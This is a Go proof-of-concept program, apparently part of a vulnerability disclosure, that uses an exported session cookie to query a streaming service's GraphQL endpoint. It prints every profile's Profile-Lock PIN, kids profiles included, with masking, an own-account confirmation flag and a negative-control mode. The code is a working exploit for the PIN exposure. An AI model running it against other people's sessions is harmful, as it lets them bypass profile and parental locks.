// Command lockpinread reads every profile's Profile-Lock PIN from a session you
// own. One persisted query; the response carries lockPin for every profile on
// the account, including kids profiles, whatever profile the session is on.
//
// The PIN is masked as `set (4 chars)` unless --show-pins is passed. Presence in
// the response is the finding; the digits are only needed when walking the gate.
package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"net/http"
	"os"

	"github.com/shoo0lin/netflix-profile-lock-pin/poc/internal/profiles"
)

const usage = `Read every profile's Profile-Lock PIN from a session you own.

One request. The response carries lockPin for every profile on the account,
whatever profile the session is currently on -- including a kids profile.

  go run ./poc/lockpinread --cookies cookies.txt --confirm-own-account
  go run ./poc/lockpinread --cookies cookies.txt --confirm-own-account --show-pins
  go run ./poc/lockpinread --no-cookie --confirm-own-account      # negative control
`

type currentJSON struct {
	GUID           string `json:"guid"`
	IsKids         any    `json:"isKids"`
	IsAccountOwner any    `json:"isAccountOwner"`
}

type profileJSON struct {
	GUID           string `json:"guid"`
	Name           any    `json:"name"`
	IsKids         any    `json:"isKids"`
	IsAccountOwner any    `json:"isAccountOwner"`
	LockPin        any    `json:"lockPin"`
}

type redactedJSON struct {
	Data struct {
		CurrentProfile currentJSON `json:"currentProfile"`
		GrowthAccount  struct {
			Profiles []profileJSON `json:"profiles"`
		} `json:"growthAccount"`
	} `json:"data"`
}

func main() { os.Exit(run()) }

func run() int {
	flag.Usage = func() { fmt.Fprint(os.Stderr, usage) }
	cookiesPath := flag.String("cookies", "", "one-line cookie string exported from your browser")
	noCookie := flag.Bool("no-cookie", false, "send the same request with no session cookie (negative control)")
	showPins := flag.Bool("show-pins", false, "print the digits, not just presence")
	asJSON := flag.Bool("json", false, "print the redacted body as JSON")
	confirm := flag.Bool("confirm-own-account", false, "confirm this is your own account")
	flag.Parse()

	profiles.RequireOwnAccount(*confirm)
	if *cookiesPath == "" && !*noCookie {
		fmt.Fprintln(os.Stderr, "need --cookies <file> (or --no-cookie for the control)")
		return 1
	}

	cookieString := ""
	if !*noCookie {
		s, err := profiles.ReadCookieFile(*cookiesPath)
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			return 1
		}
		cookieString = s
	}

	pg := profiles.PGOfCookieString(cookieString)
	if pg == "" {
		pg = "<none>"
	}
	fmt.Printf("session profile (pg): %s\n", pg)

	op := profiles.LockTemplate
	resp, err := profiles.Post(op, map[string]any{}, cookieString)
	if err != nil {
		fmt.Fprintf(os.Stderr, "error: %v\n", err)
		return 1
	}
	fmt.Printf("POST /graphql  %s  v%d  ->  HTTP %d\n", op.Name, op.Version, resp.Status)
	fmt.Printf("access-control-allow-origin: %s\n", header(resp.Headers, "access-control-allow-origin"))
	fmt.Printf("access-control-allow-credentials: %s\n", header(resp.Headers, "access-control-allow-credentials"))

	var doc map[string]any
	if err := json.Unmarshal([]byte(resp.Body), &doc); err != nil {
		fmt.Println(profiles.Truncate(resp.Body, 800))
		return 1
	}

	data := asMap(doc["data"])
	for _, e := range asSlice(doc["errors"]) {
		errMap := asMap(e)
		ext := asMap(errMap["extensions"])
		fmt.Printf("error: %s  (origin: %s)\n",
			profiles.PyString(errMap["message"]), profiles.PyString(ext["origin"]))
	}

	account := data["growthAccount"]
	if !profiles.PyTruth(account) {
		fmt.Println("growthAccount: null -- no account behind this request")
		return 0
	}

	rows := asSlice(asMap(account)["profiles"])
	current := asMap(data["currentProfile"])
	fmt.Printf("\ncurrentProfile: %s... kids=%s owner=%s\n",
		profiles.Truncate(current["guid"], 8),
		profiles.PyString(current["isKids"]),
		profiles.PyString(current["isAccountOwner"]))
	fmt.Printf("profiles returned: %d\n\n", len(rows))

	withPin := 0
	printed := make([]profileJSON, 0, len(rows))
	for _, r := range rows {
		row := asMap(r)
		lock := row["lockPin"]
		if profiles.PyTruth(lock) {
			withPin++
		}
		shown := profiles.PinValue(lock)
		if *showPins && profiles.PyTruth(lock) {
			shown = profiles.PyString(lock)
		}
		flagText := ""
		if profiles.PyTruth(lock) {
			flagText = "  <-- populated in cleartext"
		}
		fmt.Printf("  %s...  %-16s  lockPin=%s%s\n",
			profiles.Truncate(row["guid"], 8),
			profiles.Truncate(row["name"], 16),
			shown, flagText)

		pinOut := lock
		if !*showPins && profiles.PyTruth(lock) {
			pinOut = profiles.PinValue(lock)
		}
		printed = append(printed, profileJSON{
			GUID:           profiles.Truncate(row["guid"], 8),
			Name:           row["name"],
			IsKids:         row["isKids"],
			IsAccountOwner: row["isAccountOwner"],
			LockPin:        pinOut,
		})
	}

	fmt.Printf("\n%d of %d profiles returned a PIN to this session (%s).\n",
		withPin, len(rows), pyOr(current["name"], "unknown profile"))

	if *asJSON {
		var redacted redactedJSON
		redacted.Data.CurrentProfile = currentJSON{
			GUID:           profiles.Truncate(current["guid"], 8),
			IsKids:         current["isKids"],
			IsAccountOwner: current["isAccountOwner"],
		}
		redacted.Data.GrowthAccount.Profiles = printed
		var buf bytes.Buffer
		enc := json.NewEncoder(&buf)
		enc.SetEscapeHTML(false)
		enc.SetIndent("", "  ")
		if err := enc.Encode(redacted); err != nil {
			fmt.Fprintf(os.Stderr, "error: %v\n", err)
			return 1
		}
		fmt.Print(buf.String())
	}
	return 0
}

func header(h http.Header, key string) string {
	if v := h.Get(key); v != "" {
		return v
	}
	return "None"
}

func asMap(v any) map[string]any {
	if m, ok := v.(map[string]any); ok {
		return m
	}
	return nil
}

func asSlice(v any) []any {
	if s, ok := v.([]any); ok {
		return s
	}
	return nil
}

func pyOr(v any, fallback string) string {
	if !profiles.PyTruth(v) {
		return fallback
	}
	return profiles.PyString(v)
}
